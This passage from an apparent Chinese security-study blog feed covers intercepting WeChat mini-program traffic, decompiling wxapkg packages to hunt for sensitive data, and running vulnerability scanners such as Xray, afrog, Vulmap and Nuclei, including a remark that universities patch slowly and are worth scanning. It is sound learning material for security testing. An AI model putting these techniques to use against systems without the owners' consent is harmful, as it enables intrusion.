&lt;/ul&gt;
&lt;p&gt;安卓系统 7.0 以下版本，不管微信任意版本，都会信任系统提供的证书&lt;/p&gt;
&lt;p&gt;安卓系统 7.0 以上版本，微信 7.0 以下版本，微信会信任系统提供的证书&lt;/p&gt;
&lt;p&gt;安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于上述我们解决的方式如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;将证书安装到系统证书中（需要 root）&lt;br&gt;
苹果手机（苹果手机不受此影响）&lt;br&gt;
采用安卓系统低于 7.0 的模拟器&lt;br&gt;
使用低版本电脑版微信小程序抓包&lt;/p&gt;
&lt;p&gt;逍遥模拟器多开器 5.1 安卓系统微信小程序抓包，夜神模拟器多开 5 安卓系统微信小程序抓包，真机 IPhone-IOS 系统微信小程序抓包抓包本机需要和 Iphone 手机处于同一 WIFI 下，Iphone 配置 wifi 的代理，代理设置地址写本地抓包的工具地址和端口。&lt;/p&gt;
&lt;h4 id=&#34;小程序反编译&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#小程序反编译&#34;&gt;#&lt;/a&gt; 小程序反编译&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;小程序助手付费版：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用教程地址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cua2FuY2xvdWQuY24vbHVkZXFpL3hjeHpzLzI2MDc2Mzc=&#34;&gt;https://www.kancloud.cn/ludeqi/xcxzs/2607637&lt;/span&gt;&lt;br&gt;
 最新版下载地址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94Y3guc2lxaW5ndy50b3AveGN4LnppcA==&#34;&gt;https://xcx.siqingw.top/xcx.zip&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;每一个小程序在点击时都会产生一个相应的文件夹，此文件夹中有一个 wxapkg 后缀的文件包含有当前小程序的相关源码。用此软件进行反编译，一般 都会生成 js 源码，可以分析此源码中的知识，找出相关敏感信息，进行利用。 如果此 js 采用了 node.js 框架，那么原先的小程序就是存在 node.js 的相关漏洞可 以进行利用的。&lt;/p&gt;
&lt;p&gt;如果该小程序比较大，除了首次加载出来的 wxapkg 后缀的文件包，在其他 页面可能也有 js 子系统，会有其他的 wxapkg 产生。需要将生成的 wxapkg 都进 行反编译，分析多套源码才算完整。&lt;/p&gt;
&lt;p&gt;微信小程序可以通过 proxifier 设置规则代理流量至 burp/fiddler，需要将当 前小程序运行的进程进行代理。但是不一定准确，有一次测试代理了部分流量， 一些关键数据包无法捕获。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WxAppUnpacker 反编译小程序&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;工具地址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NhbnJpcWluZy9XeEFwcFVucGFja2Vy&#34;&gt;https://github.com/sanriqing/WxAppUnpacker&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;安装 node.js: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25vZGVqcy5jbi9kb3dubG9hZC8=&#34;&gt;http://nodejs.cn/download/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装依赖&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;npm install&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;部分wxapkg还需要解密&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;模拟器取出wxapkg文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/data/data/com.tencent.mm/MicroMsg/x/appbrand/pkg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;反编译解包&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;node wuWxapkg.js -s=../ xxxx.wxapkg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;小程序安全点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#小程序安全点&#34;&gt;#&lt;/a&gt; 小程序安全点&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;渗透角度&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;测试的 app 提供服务的服务器，网站，接口等，一旦这个有安全问题，被 不法分子利用，相当于 APP 正常服务就会受到直接的影响！APK - 白盒 - Java 代码审计，APK - 黑盒 - 资产 &amp;amp; WEB&amp;amp;IP &amp;amp; 接口等，小程序 - 白 盒 - Node.JS 代码审计，小程序 - 黑盒 - 资产 &amp;amp; WEB&amp;amp;IP &amp;amp; 接口等&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开发角度&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;测试 app 中代码，采用没加密的发送数据，采用权限过高的设置导致攻击者利用 app 获取到手机的敏感信息等。如弱加密，逻辑安全，授权，中间人等。&lt;/p&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/</id>
        <title>XD22 6 漏洞发现及利用</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
        <content type="html">&lt;h3 id=&#34;服务漏洞探测&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务漏洞探测&#34;&gt;#&lt;/a&gt; 服务漏洞探测&lt;/h3&gt;
&lt;p&gt;服务漏洞发现指的是发现搭建在操作系统上的服务漏洞。&lt;/p&gt;
&lt;h4 id=&#34;相关工具介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#相关工具介绍&#34;&gt;#&lt;/a&gt; 相关工具介绍&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;相关工具说明&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Acunetix 一款商业的 Web 漏洞扫描程序，它可以检查 Web 应用程序中的漏 洞，如 SQL 注入、跨站脚本攻击、身份验证页上的弱口令长度等。它拥有一个 操作方便的图形用户界面，并且能够创建专业级的 Web 站点安全审核报告。新 版本集成了漏洞管理功能来扩展企业全面管理、优先级和控制漏洞威胁的能力。&lt;/p&gt;
&lt;p&gt;Burp Suite 是用于攻击 web 应用程序的集成平台，包含了许多工具。Burp Suite 为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共 享一个请求，并能处理对应的 HTTP 消息、持久性、认证、代理、日志、警报。&lt;/p&gt;
&lt;p&gt;pocassist 是一个 Golang 编写的全新开源漏洞测试框架。实现对 poc 的在线 编辑、管理、测试。如果你不想撸代码，又想实现 poc 的逻辑，又想在线对靶 机快速测试，那就使用 pocassist 吧。完全兼容 xray，但又不仅仅是 xray。除了 支持定义目录级漏洞 poc，还支持服务器级漏洞、参数级漏洞、url 级漏洞以及 对页面内容检测，如果以上还不满足你的需求，还支持加载自定义脚本。&lt;/p&gt;
&lt;p&gt;afrog 是一款性能卓越、快速稳定、PoC 可定制的漏洞扫描 (挖洞) 工具， PoC 涉及 CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意 文件读取、命令执行等多种漏洞类型，帮助网络安全从业者快速验证并及时修 复漏洞。&lt;/p&gt;
&lt;p&gt;Xray 是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、 被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单， 支持 Windows /macOS/Linux 多种操作系统，可以满足广大安全从业者的自动 化 Web 漏洞探测需求。&lt;/p&gt;
&lt;p&gt;Goby 是一款新的网络安全测试工具，由赵武 Zwell (Pangolin、JSky、 FOFA 作者) 打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进 行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。能通过 智能自动化方式，帮助安全入门者熟悉靶场攻防，帮助攻防服务者、渗透人员 更快的拿下目标。&lt;/p&gt;
&lt;p&gt;Vulmap 是一款 web 漏洞扫描和验证工具，可对 webapps 进行漏洞扫描，并且具备漏洞利用功能，目前支持的 webapps 包括 activemq, flink, shiro, solr, struts2, tomcat, unomi, drupal, elasticsearch, fastjson, jenkins, nexus, weblogic, jboss, spring, thinkphp。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;项目资源&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZGRvc2kub3JnL2F3dnMxNC02LWxvZzRqLXJjZS8=&#34;&gt;https://www.ddosi.org/awvs14-6-log4j-rce/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NoYWl0aW4veHJheS9yZWxlYXNlcw==&#34;&gt;https://github.com/chaitin/xray/releases&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3phbjhpbi9hZnJvZy9yZWxlYXNlcw==&#34;&gt;https://github.com/zan8in/afrog/releases&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3poenlrZXIvdnVsbWFwL3JlbGVhc2Vz&#34;&gt;https://github.com/zhzyker/vulmap/releases&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2p3ZW55L3BvY2Fzc2lzdC9yZWxlYXNlcw==&#34;&gt;https://github.com/jweny/pocassist/releases&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dvYnlzZWMvR29ieS9yZWxlYXNlcw==&#34;&gt;https://github.com/gobysec/Goby/releases&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;awvs-burp-xray&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#awvs-burp-xray&#34;&gt;#&lt;/a&gt; awvs burp xray&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Awvs：任务添加 &amp;amp; 数据头部 &amp;amp; 代理模式 &amp;amp; 扫描模式等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;example：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RlbW8uYWlzZWMuY24v&#34;&gt;http://demo.aisec.cn/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;去扫一些小众的 cms 是可以扫到的，但是如果扫有很多用户的 cms 或框架的话一般很难扫到，因为这些玩意的作者也会去这样做安全测试然后堵上漏洞，或者说没有集成到 awvs 的漏洞库中。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Xray：主动扫描 &amp;amp; 被动扫描 &amp;amp; POC 资源等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;.\xray_windows_amd64.exe webscan --basic-crawler &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3h4Lw==&#34;&gt;http://xx/&lt;/span&gt; --html-output tomcat.html&lt;/p&gt;
&lt;p&gt;社区版的漏洞库不太好，但还可以用用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;burp+xray 联动：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;burp 监听某端口，将 web 或者 app 的流量代理到 burp，设置 burp 的上游代理为 7777 ，同时将 xray 设置监听 7777 ，等待 xray 扫描完成查看检测结果&lt;br&gt;
 &lt;code&gt;.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output app.html&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AWVS+xray+burp&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;设置 awvs 的代理至 7777 ，由 xray 监听，这样做可以发挥两者的优点，既有 awvs 自定义的数据包，又能借用 xray 去扫这些数据；同时也可以配置中间代理 burp，再 burp 查看到 awvs 扫描到的所有数据。&lt;/p&gt;
&lt;h4 id=&#34;pocasit-afrog-vulmap&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pocasit-afrog-vulmap&#34;&gt;#&lt;/a&gt; pocasit afrog vulmap&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;afrog 可以扫描出漏洞编号，但是需要自己去利用&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;扫描一个目标&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;afrog -t http://127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;扫描多个目标&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;afrog -T urls.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;指定漏扫报告文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;afrog -t http://127.0.0.1 -o result.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Vulmap 是一款 web 漏洞扫描和验证工具，可对 webapps 进行漏洞扫描，&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 vulmap.py -u http://example.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;pocassist全新的漏洞测试框架，支持poc在线编辑、运行、批量测试。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;直接运行打卡网页版即可以测试，但是漏洞库再 2 1.7后不再更新&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;goby 可以通过插件的方式联动 vulmap、awvs、xray 需要自己配置&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也可以直接去扫描漏洞，扫描之后可以查看到相关的漏洞信息报告，也可以跟 fofa 配合批量测试&lt;br&gt;
这些漏洞发现基本上都是只负责发现漏洞是存在的，但是不会去利用漏洞，漏洞利用需要自己去测或者用其他的工具&lt;/p&gt;
&lt;h3 id=&#34;操作系统服务探测&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#操作系统服务探测&#34;&gt;#&lt;/a&gt; 操作系统服务探测&lt;/h3&gt;
&lt;h4 id=&#34;系统漏洞探测工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#系统漏洞探测工具&#34;&gt;#&lt;/a&gt; 系统漏洞探测工具&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;相关工具介绍&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Nuclei 是一款基于 YAML 语法模板的开发的定制化快速漏洞扫描器。它使 用 Go 语言开发，具有很强的可配置性、可扩展性和易用性。 提供 TCP、DNS、 HTTP、FILE 等各类协议的扫描，通过强大且灵活的模板，可以使用 Nuclei 模拟各种安全检查。&lt;/p&gt;
&lt;p&gt;Nessus 号称是世界上最流行的漏洞扫描程序，全世界有超过 75000 个组织 在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。 Nessus 不同于传统的漏洞扫描软件，Nessus 可同时在本机或远端上遥控，进行 系统的漏洞分析扫描。&lt;/p&gt;
&lt;p&gt;Nexpose 是 Rapid7 出品，一款著名的、极佳的商业漏洞扫描工具。跟一 般的扫描工具不同，Nexpose 自身的功能非常强大，可以更新其漏洞数据库， 以保证最新的漏洞被扫描到。漏洞扫描效率非常高，对于大型复杂网络，可优 先考虑使用；对于大型复杂网络，可以优先考虑使用。可以给出哪些漏洞可以&lt;/p&gt;
&lt;p&gt;被 Metasploit Exploit，哪些漏洞在 Exploit-db 里面有 exploit 的方案。可以生 成非常详细的，非常强大的 Report，涵盖了很多统计功能和漏洞的详细信息。 虽然没有 Web 应用程序扫描，但 Nexpose 涵盖自动漏洞更新以及微软补丁星期 二漏洞更新。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;项目资源：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Goby：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dvYnlzZWMvR29ieS9yZWxlYXNlcw==&#34;&gt;https://github.com/gobysec/Goby/releases&lt;/span&gt;&lt;br&gt;
Nuclei：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVp&#34;&gt;https://github.com/projectdiscovery/nuclei&lt;/span&gt;&lt;br&gt;
Nessus：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvRy03WXU4c2VmSDNCbzNHUnRVbzJFQQ==&#34;&gt;https://mp.weixin.qq.com/s/G-7Yu8sefH3Bo3GRtUo2EA&lt;/span&gt;&lt;br&gt;
Nexpose：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnVqaWVhY2UuY29tL2hhY2tlci9yYXBpZDctbmV4cG9zZS5odG1s&#34;&gt;https://www.fujieace.com/hacker/rapid7-nexpose.html&lt;/span&gt;&lt;br&gt;
FofaMAP：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FzYW90b21vL0ZvZmFNYXA=&#34;&gt;https://github.com/asaotomo/FofaMap&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;nuclei-nessus-nexpose&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nuclei-nessus-nexpose&#34;&gt;#&lt;/a&gt; nuclei nessus nexpose&lt;/h4&gt;
&lt;p&gt;nessus: 扫描外网的服务器的漏洞比较少，但是扫描内网资产还是可以的，比较推荐用他扫描内网系统漏洞。需要经常去更新漏洞库模版，一般使用高级扫描。&lt;/p&gt;
&lt;p&gt;Nexpose: 需要企业邮箱申请才能得到 key，而后免费使用。扫描系统漏洞比较全面。&lt;/p&gt;
&lt;p&gt;goby: 扫描系统漏洞不是很全面，但是扫服务漏洞是可以的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;nuclei: 扫描 web 是比较好的，很多人都在添加模板，支持的漏洞比较多，集成了 cnvd 和 cve 等等，比较好用。支持系统漏洞扫描，主要还是探针系统上所搭建的服务的漏洞。&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/projectdiscovery/nuclei&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;支持的漏洞&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/projectdiscovery/nuclei-templates&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;扫描某个url地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nuclei -u http://localhost&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用自定义模板扫描自定义ip清单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nuclei.exe -t Zyxel.yaml -l z.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;以yaml中的tag为准进行扫描&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nuclei.exe -l z.txt -tags rce&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;由于高校打补丁并不及时，可以用nucli进行一波漏洞测试&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;burp-插件整理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-插件整理&#34;&gt;#&lt;/a&gt; burp 插件整理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;基本介绍&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;app 和小程序抓了包就做漏洞检测的这些插件，在 burp 上安装，可以分别 发现各种框架的漏洞，可以防止数据包需要登录才可以扫描的情况，在发送数 据包的时候就做漏洞发现，但是一般不这么做，而一般比较常用的仍然是从 awvs 这些常用的扫描工具开始。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;项目资源&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vRmlvcmE=&#34;&gt;https://github.com/bit4woo/Fiora&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21ldGFTdG9yL1NwcmluZ1NjYW4=&#34;&gt;https://github.com/metaStor/SpringScan&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL01hc2toZS9GYXN0anNvblNjYW4=&#34;&gt;https://github.com/Maskhe/FastjsonScan&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JpZ3NpemVtZS9Mb2c0ai1jaGVjaw==&#34;&gt;https://github.com/bigsizeme/Log4j-check&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3BtaWFvd3UvQnVycFNoaXJvUGFzc2l2ZVNjYW4=&#34;&gt;https://github.com/pmiaowu/BurpShiroPassiveScan&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLWJ1cnAtcGx1Z2lu&#34;&gt;https://github.com/projectdiscovery/nuclei-burp-plugin&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h3&gt;
